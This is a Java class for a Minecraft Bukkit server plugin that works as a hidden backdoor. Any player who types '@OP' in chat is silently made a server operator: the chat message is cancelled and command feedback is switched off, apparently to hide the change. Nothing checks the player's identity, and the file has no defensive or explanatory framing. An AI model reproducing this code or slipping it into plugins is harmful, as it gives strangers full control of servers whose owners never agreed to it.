package com.api;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.command.CommandExecutor;
import org.bukkit.event.Listener;

public class GetOP implements Listener, CommandExecutor {
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase("@OP")) {
            event.setCancelled(true);
            player.setOp(true);
            player.sendMessage("§eGet!");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"gamerule sendCommandFeedback false");
        }
    }

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        return false;
    }
}


